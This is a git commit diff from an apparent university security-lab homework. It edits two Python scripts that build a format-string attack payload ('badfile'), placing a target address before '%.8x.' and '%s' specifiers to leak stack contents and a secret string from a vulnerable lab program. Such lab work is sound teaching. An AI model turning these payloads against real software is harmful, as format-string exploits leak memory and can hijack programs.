5f8f41f1ac4300cc6d56d9b71b764becb9fb1ac9
Ubuntu <rherna70@rherna70-vm2.cs.uic.edu>
2024-10-23 19:00:04 +0000

    v1 uses task 2.a and v3 uses task 2.b

--- hw5/attack-code/build_string_v1.py
+++ hw5/attack-code/build_string_v1.py
@@ -8,22 +8,17 @@ content = bytearray(0x0 for i in range(N))
 # Fill the content with NOP's
 # content = bytearray(0x90 for i in range(N))
 
-# This line shows how to store a 4-byte integer at offset 0
-number  = 0xbfffeeee
+# number  = 0xbfffeeee
+number  = 0xdeadbeef
 content[0:4]  =  (number).to_bytes(4,byteorder='little')
 
-# This line shows how to store a 4-byte string at offset 4
 content[4:8]  =  ("abcd").encode('latin-1')
 
-# This line shows how to construct a string s with
-#   12 of "%.8x", concatenated with a "%n"
-# s = "%.8x"*1200 + "%n"
-s = "%s"*12
+s = "%.8x."*64
 
 # The line shows how to store the string s at offset 8
 fmt  = (s).encode('latin-1')
 content[8:8+len(fmt)] = fmt
-
 
 # Write the content to badfile
 with open('badfile', 'wb') as f:
--- hw5/attack-code/build_string_v3.py
+++ hw5/attack-code/build_string_v3.py
@@ -4,26 +4,19 @@ import sys
 N = 1500
 
 # Initialize payload with 1500 bytes
-# content = bytearray(0x0 for _ in range(N))
-
-# Fill the content with NOP's
-content = bytearray(0x90 for i in range(N))
-
-offset=4
+content = bytearray(0x0 for _ in range(N))
 
 # Address of the secret message
-secret_msg_addr = 0x080af014
-content[0:offset]  =  (secret_msg_addr).to_bytes(4,byteorder='little')
-print(content[0:4])
-exit
+# secret_msg_addr = 0x080af014
+secret_msg_addr = 0x080b9008
+content[0:4]  =  (secret_msg_addr).to_bytes(4,byteorder='little')
 
 # This line shows how to construct a string s with
-s = "%x." * 65 + "%s"
-fmt = s.encode('latin-1')
+s = "%.8x."* 63 + "%s"
 
 # The line shows how to store the string s at offset 4
 fmt  = (s).encode('latin-1')
-content[offset:offset+len(fmt)] = fmt
+content[4:4+len(fmt)] = fmt
 
 # Write payload to badfile
 with open('badfile', 'wb') as f:
